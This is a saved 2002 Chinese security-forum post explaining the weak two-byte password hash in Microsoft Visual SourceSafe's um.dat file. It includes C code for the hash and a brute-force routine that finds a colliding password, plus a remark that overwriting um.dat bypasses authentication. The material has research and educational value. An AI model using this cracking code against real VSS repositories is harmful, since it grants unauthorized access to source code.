@@ -1,0 +1,150 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0050)http://www.dircity.com/newspub/html/3-2/12572.html -->
+<HTML><HEAD><TITLE></TITLE>
+<META http-equiv=Content-Type content="text/html; charset=gb2312">
+<STYLE type=text/css>BODY {
+	FONT-SIZE: 9pt; FONT-FAMILY: "宋体", "Arial"
+}
+TD {
+	FONT-SIZE: 9pt; FONT-FAMILY: "宋体", "Arial"
+}
+A {
+	FONT-SIZE: 9pt; COLOR: #0000ff; FONT-FAMILY: "宋体"; TEXT-DECORATION: none
+}
+A:hover {
+	FONT-SIZE: 9pt; COLOR: #ff0000; FONT-FAMILY: "宋体"; TEXT-DECORATION: underline
+}
+</STYLE>
+
+<META content="MSHTML 6.00.2900.2963" name=GENERATOR></HEAD>
+<BODY text=#000000 bgColor=#ffffff leftMargin=0 topMargin=0>
+<TABLE borderColor=#3399ff height="100%" cellSpacing=2 cellPadding=0 
+width="100%" border=3>
+  <TBODY>
+  <TR>
+    <TD vAlign=top bgColor=#f4faff>
+      <TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#f4faff 
+        border=0><TBODY>
+        <TR>
+          <TD>
+            <TABLE height="100%" cellSpacing=0 cellPadding=0 width="92%" 
+            align=center border=0>
+              <TBODY>
+              <TR>
+                <TD>
+                  <HR align=center width="100%" color=#00ccff noShade SIZE=1>
+                </TD></TR>
+              <TR>
+                <TD>发帖者：<A 
+                  href="http://www.xfocus.net/bbs/index.php?lang=cn&amp;act=Profile&amp;do=03&amp;MID=20515" 
+                  target=_blank>flashsky</A> 
+                  讨论区：<B>技术研究推荐区</B><BR>标题：<BR>发信站：安全焦点（2002年9月20日19时41分07秒） 
+
+                  <P>天啊，VSS的认证过程真是老土，当然对于具有本地管理员权限的人只需要覆盖掉date\um.dat文件就可以更改口令。而且VSS本身是靠文件共享的，安全性极差，不过如果不知道其口令，其文件的组织还是比较麻烦的，如果知道了口令的话，就容易处理的多。所以我这篇帖子都不好意思当文章提交的，其实这篇文章重点不是讲如何获取VSS的口令，而是讲一下算法破解的思路。<BR><BR>VSS的口令认证过程是这样的，从DATE目录下的UM文件读取口令加密字串，而这个文件是任何可以共享VSS目录的人都可以看见的，一般而言这个目录都会设置比较低级别的共享。VSS的加密口令实际上是一个2位的散列：格式如下：<BR>55 
+                  55 FF D2 41 64 6D 69-6E 00 00 00 00 00 00 00&nbsp;&nbsp; 
+                  UU..Admin.......<BR>00 00 00 00 00 00 00 00-00 00 00 00 00 00 
+                  00 00&nbsp;&nbsp; ................<BR>00 00 00 00 1A 69 00 
+                  00-A8 01 00 00 00 00 00 00&nbsp;&nbsp; .....i..........<BR>00 
+                  00 00 00 00 00 00 00-00 00 00 00 38 00 00 00&nbsp;&nbsp; 
+                  ............8...<BR>55 55 90 80 47 75 65 73-74 00 00 00 00 00 
+                  00 00&nbsp;&nbsp; UU..Guest.......<BR>00 00 00 00 00 00 00 
+                  00-00 00 00 00 00 00 00 00&nbsp;&nbsp; ................<BR>00 
+                  00 00 00 55 69 00 00-3C 02 00 00 00 00 00 00&nbsp;&nbsp; 
+                  ....Ui..&lt;.......<BR>00 00 00 00 00 00 00 00-00 00 00 00 00 
+                  00 00 00&nbsp;&nbsp; ................<BR>其中1A 
+                  69就是ADMIN的散列<BR>而&nbsp;&nbsp;55 
+                  69就是GUEST的散列<BR><BR>跟踪一下VSS的算法可以得出如下的加密算法，另外在加密之前，串入的口令会先转化成大写格式的。<BR>void 
+                  envsspasswd(char * passwd,char * enpasswd,int 
+                  len)<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;const char 
+                  incstr[15]="BrianDavidHarry";<BR>&nbsp;&nbsp;&nbsp;&nbsp;char 
+                  passwd1[200];<BR>&nbsp;&nbsp;&nbsp;&nbsp;int 
+                  i;<BR>&nbsp;&nbsp;&nbsp;&nbsp;WORD 
+                  a;<BR>&nbsp;&nbsp;&nbsp;&nbsp;WORD 
+                  b;<BR>&nbsp;&nbsp;&nbsp;&nbsp;if(len&gt;15)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+                  0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;memcpy(passwd1,passwd,len);<BR>&nbsp;&nbsp;&nbsp;&nbsp;memcpy(passwd1+len,incstr,15-len);<BR>&nbsp;&nbsp;&nbsp;&nbsp;passwd1[15]=0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;len 
+                  = 15;<BR>&nbsp;&nbsp;&nbsp;&nbsp;b = 
+                  0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;a = 
+                  0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;for(i=0;i&lt;len;i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a 
+                  =&nbsp;&nbsp;passwd1[i]; 
+                  <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a = a ^ 
+                  0x96;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a = 
+                  a*(i+1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b 
+                  += 
+                  a;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("%02x",b);<BR>}<BR><BR>OK，其实我们讲到这里，关于VSS的口令破解就一点意义也没有了，而是在一个思路上，从上面可以看到，其口令只具2位长度，因此肯定存在很多散列一致的口令，因此无需真正找到口令，只需要找到一个具备同样散列的口令就可以了。<BR>当然，如果只是暴力跑的话，效果会比较差的，因为上面这个算法会导致相同位数的散列是比较靠近的，不同位数的散类差距比较大，如果不知道口令的位数，一位的穷局举的话效果并不会很理想。那么如何来确定密码的位数呢？实际根据上面的加密算法我们可以知道其密码散列递增的规律，下面的实现就是根据这个算法可以最优先的找到密码位数，然后在位数以内进行穷举的实现，使得计算的速度非常高：<BR>关键点在于这句：<BR>&nbsp;&nbsp;&nbsp;&nbsp;d 
+                  = a - b;<BR>&nbsp;&nbsp;&nbsp;&nbsp;if((d/num)&gt;154 
+                  &amp;&amp; 
+                  (d/num)&lt;250)<BR>因为我们知道，x^80肯定是会大于128的，对于‘0’到‘Z’的可能口令组合，最小生成的都应该大于154。从而判断这个长度是否可能存在可能的解。<BR><BR>int 
+                  devsspasswd(char enp[4],char * 
+                  dnp)<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;const char 
+                  incstr[15]="BrianDavidHarry";<BR>&nbsp;&nbsp;&nbsp;&nbsp;int 
+                  i;<BR>&nbsp;&nbsp;&nbsp;&nbsp;int 
+                  j;<BR>&nbsp;&nbsp;&nbsp;&nbsp;int 
+                  k;<BR>&nbsp;&nbsp;&nbsp;&nbsp;long 
+                  c1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;long 
+                  c2;<BR>&nbsp;&nbsp;&nbsp;&nbsp;long 
+                  c4;<BR>&nbsp;&nbsp;&nbsp;&nbsp;int 
+                  c3;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;WORD 
+                  a;<BR>&nbsp;&nbsp;&nbsp;&nbsp;WORD 
+                  b;<BR>&nbsp;&nbsp;&nbsp;&nbsp;WORD 
+                  c;<BR>&nbsp;&nbsp;&nbsp;&nbsp;WORD 
+                  d;<BR>&nbsp;&nbsp;&nbsp;&nbsp;WORD 
+                  e;<BR>&nbsp;&nbsp;&nbsp;&nbsp;int 
+                  num;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;a = 
+                  hextoint(enp[2])*16*16*16+hextoint(enp[3])*16*16+hextoint(enp[0])*16+hextoint(enp[1]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;c3 
+                  = 
+                  'Z'-'0'+1;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;for(i=0;i&lt;15;i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dnp[i]=0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b 
+                  =0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(j=0;j&lt;15-i;j++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c 
+                  = incstr[j]; 
+                  <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c 
+                  = c ^ 
+                  0x96;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c 
+                  = 
+                  c*(j+1+i);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b 
+                  += 
+                  c;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(i==0 
+                  &amp;&amp; 
+                  b==a)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("password 
+                  is 
+                  null\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+                  0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d 
+                  = a - 
+                  b;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;num = 
+                  0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c2 = 
+                  1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(j=0;j&lt;i;j++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;num 
+                  = 
+                  num+j+1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c2 
+                  = 
+                  c3*c2;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(num&gt;0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c1 
+                  = 
+                  0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if((d/num)&gt;154 
+                  &amp;&amp; 
+                  (d/num)&lt;250)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset(dnp,'0',i);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sleep(100);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;do{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c4 
+                  = 
+                  1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(j=1;j&lt;i-1;j++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c4 
+                  = c4 * 
+                  c3;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(c1%c4==0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dnp[j]='0';<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dnp[j]++;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b 
+                  = 
+                  0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(k=1;k&lt;i;k++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c 
+                  = dnp[k]; 
+                  <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c 
+                  = c ^ 
+                  0x96;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c 
+                  = 
+                  c*(k+1);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;b 
+                  += 
+                  c;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e=d-b;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if((e^0x96)&gt;='0' 
+                  &amp;&amp; (e^0x96)&lt;='Z') 
+                  <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dnp[0]=(e^0x96);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%s\n",dnp);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+                  i;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c1++;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}while(c1&lt;c2);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;return 
+                  0;&nbsp;&nbsp;&nbsp;&nbsp;<BR>}<BR><BR>当然，这个算法对VSS口令破解本身意义不大，拥有um.dat写权限的直接拷贝别人的知道口令的um.dat文件覆盖就可以，或者修改其中的散列，不知道的呢，也可以直接通过共享拷贝数据文件再使用um.dat覆盖或者在vss程序中饶过口令达到图破权限，写这点东西是重点强调一下破解算法的思路。 
+                  </P>--<BR>买赋长门车马喧，争饮豕槽醉既眠。<BR>悟空五湖三山树，禅枯半月一溪天。<BR>断路蚍蜉本是梦，菜菊东篱聊为仙。<BR>行痴莫笑无孔窍，钓雪何妨年复年。<BR><BR>www.xfocus.net<BR>www.flashsky.org
+                  <HR align=center width="100%" color=#00ccff noShade SIZE=1>
+                </TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<SCRIPT language=JavaScript> 
+    var					__cc_uid="dircity";var __cc_style = 1; 
+						</SCRIPT>
+
+<SCRIPT language=JavaScript 
+src="VSS的口令破解算法的思路---整理编辑 都市目录(www_dircity_com).files/count.js"> 
+						</SCRIPT>
+</BODY></HTML>
